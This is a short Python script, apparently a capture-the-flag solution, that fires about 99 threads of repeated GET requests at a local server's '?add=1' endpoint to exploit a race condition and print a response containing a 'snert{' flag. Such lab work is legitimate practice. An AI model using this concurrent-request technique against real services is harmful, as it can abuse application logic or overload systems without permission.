import requests
import threading

url = "http://127.0.0.1:8080/?add=1"
threads = 99
def go():
    for i in range(99):
        r = requests.get(url)
        if "snert{" in r.text:
            print(r.text)
for i in range(threads):
    t = threading.Thread(target=go)
    t.start()
for i in range(threads):
    t.join()
